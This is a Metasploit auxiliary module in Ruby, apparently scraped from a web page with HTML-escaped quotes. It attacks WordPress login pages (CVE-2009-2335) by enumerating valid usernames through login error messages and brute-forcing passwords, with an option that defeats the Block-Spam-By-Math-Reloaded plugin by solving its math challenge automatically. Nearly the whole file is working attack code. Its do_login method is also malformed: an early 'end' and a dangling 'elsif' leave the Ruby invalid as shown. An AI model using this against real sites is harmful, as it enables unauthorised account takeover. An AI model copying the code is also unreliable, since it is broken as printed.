##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
 
class Metasploit3 < Msf::Auxiliary
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Auxiliary::AuthBrute
    include Msf::Auxiliary::Report
    include Msf::Auxiliary::Scanner
 
 
    def initialize
        super(
            &#039;Version&#039;        => &#039;$Revision: 12196 $&#039;,
            &#039;Author&#039;         => [
                &#039;Alligator Security Team&#039;,
                &#039;Tiago Ferreira <tiago.ccna[at]gmail.com>&#039;,
        &#039;Heyder Andrade <heyder[at]alligatorteam.org>&#039; # Block-Spam-By-Math-Reloaded Bypass
        ],
            &#039;References&#039;     =>
                [
                    [&#039;BID&#039;, &#039;35581&#039;],
                    [&#039;CVE&#039;, &#039;2009-2335&#039;],
                    [&#039;OSVDB&#039;, &#039;55713&#039;],
                ],
            &#039;License&#039;        =>  MSF_LICENSE
        )
 
        register_options(
            [ Opt::RPORT(80),
                OptString.new(&#039;URI&#039;, [false, &#039;Define the path to the wp-login.php file&#039;, &#039;/wp-login.php&#039;]),
                OptBool.new(&#039;VALIDATE_USERS&#039;, [ true, "Enumerate usernames", true ]),
                OptBool.new(&#039;BSBM_BYPASS&#039;, [ true, "Block-Spam-By-Math-Reloaded Bypass ", false]),
                OptBool.new(&#039;BRUTEFORCE&#039;, [ true, "Perform brute force authentication", true ]),
        ], self.class)
 
    end
 
    def target_url
        "http://#{vhost}:#{rport}#{datastore[&#039;URI&#039;]}"
    end
 
 
    def run_host(ip)
        if datastore[&#039;VALIDATE_USERS&#039;]
            @users_found = {}
            vprint_status("#{target_url} - WordPress Enumeration - Running User Enumeration")
            each_user_pass { |user, pass|
                do_enum(user)
            }
 
            unless (@users_found.empty?)
                print_good("#{target_url} - WordPress Enumeration - Found #{uf = @users_found.keys.size} valid #{uf == 1 ? "user" : "users"}")
            end
        end
 
        if datastore[&#039;BRUTEFORCE&#039;]
            vprint_status("#{target_url} - WordPress Brute Force - Running Bruteforce")
            if datastore[&#039;VALIDATE_USERS&#039;]
                if @users_found && @users_found.keys.size > 0
                    vprint_status("#{target_url} - WordPress Brute Force - Skipping all but #{uf = @users_found.keys.size} valid #{uf == 1 ? "user" : "users"}")
                else
                    vprint_status("#{target_url} - WordPress Brute Force - No valid users found. Exiting.")
                    return
                end
            end
            each_user_pass { |user, pass|
                if datastore[&#039;VALIDATE_USERS&#039;]
                    next unless @users_found[user]
                end
                    do_login(user, pass)
            }
        end
    end
 
    def do_enum(user=nil)
        post_data = "log=#{Rex::Text.uri_encode(user.to_s)}&pwd=x&wp-submit=Login"
        print_status("#{target_url} - WordPress Enumeration - Checking Username:&#039;#{user}&#039;")
 
        begin
 
            res = send_request_cgi({
                &#039;method&#039;  => &#039;POST&#039;,
                &#039;uri&#039;     => datastore[&#039;URI&#039;],
                &#039;data&#039;    => post_data,
            }, 20)
 
 
            valid_user = false
 
            if (res and res.code == 200 )
                if (res.body.to_s =~ /Incorrect password/ )
                    valid_user = true
 
                elsif (res.body.to_s =~ /document\.getElementById\(\&#039;user_pass\&#039;\)/ )
                    valid_user = true
 
                else
                    valid_user = false
 
                end
 
            else
                print_error("#{target_url} - WordPress Enumeration - Enumeration is not possible. #{res.code} response")
                return :abort
 
            end
 
            if valid_user
                print_good("#{target_url} - WordPress Enumeration- Username: &#039;#{user}&#039; - is VALID")
                report_auth_info(
                    :host => rhost,
                    :sname => &#039;http&#039;,
                    :user => user,
                    :port => rport,
                )
 
                @users_found[user] = :reported
                return :next_user
            else
                vprint_error("#{target_url} - WordPress Enumeration - Invalid Username: &#039;#{user}&#039;")
                return :skip_user
            end
 
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
        rescue ::Timeout::Error, ::Errno::EPIPE
        end
    end
 
  def smartaleck(values)
    answer = 0
    values.each { |a| answer+=a.to_i }
    return answer
  end
 
  def getvalues(response)
    i = 0
    values = []
    while (i <= 1) do
        response.body.match(%r{.?(mathvalue#{i}).*(value=).([\d]+)})
        values[i] = $3
        i += 1
    end
    return values
  end
 
  def baserequest()
    begin
    res = send_request_cgi({
        &#039;method&#039;  => &#039;GET&#039;,
        &#039;uri&#039;     => datastore[&#039;URI&#039;],
      }, 20)
    return res
    end
  end
 
 
    def do_login(user=nil,pass=nil)
    if (datastore[&#039;BSBM_BYPASS&#039;])
      v = getvalues(baserequest())
      sec_answer = smartaleck(v)
          post_data = "log=#{Rex::Text.uri_encode(user.to_s)}&pwd=#{Rex::Text.uri_encode(pass.to_s)}&mathvalue2=#{sec_answer}&mathvalue0=#{v[0]}&mathvalue1=#{v[1]}&&wp-submit=Login"
    else
          post_data = "log=#{Rex::Text.uri_encode(user.to_s)}&pwd=#{Rex::Text.uri_encode(pass.to_s)}&wp-submit=Login"
          vprint_status("#{target_url} - WordPress Brute Force - Trying username:&#039;#{user}&#039; with password:&#039;#{pass}&#039;")
    end
 
        begin
 
            res = send_request_cgi({
                &#039;method&#039;  => &#039;POST&#039;,
                &#039;uri&#039;     => datastore[&#039;URI&#039;],
                &#039;data&#039;    => post_data,
            }, 20)
 
            if (res and res.code == 302 )
                    print_good("#{target_url} - WordPress Brute Force - SUCCESSFUL login for &#039;#{user}&#039; : &#039;#{pass}&#039;")
                    report_auth_info(
                        :host => rhost,
                        :port => rport,
                        :sname => &#039;http&#039;,
                        :user => user,
                        :pass => pass,
                        :active => true
                    )
 
                    return :next_user
                end
 
                print_error("#{target_url} - WordPress Brute Force - Unrecognized 302 response")
                return :abort
 
            elsif res.body.to_s =~ /login_error/
                vprint_error("#{target_url} - WordPress Brute Force - Failed to login as &#039;#{user}&#039;")
                return
            else
                print_error("#{target_url} - WordPress Brute Force - Unrecognized #{res.code} response") if res
                return :abort
            end
 
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
        rescue ::Timeout::Error, ::Errno::EPIPE
        end
    end
end



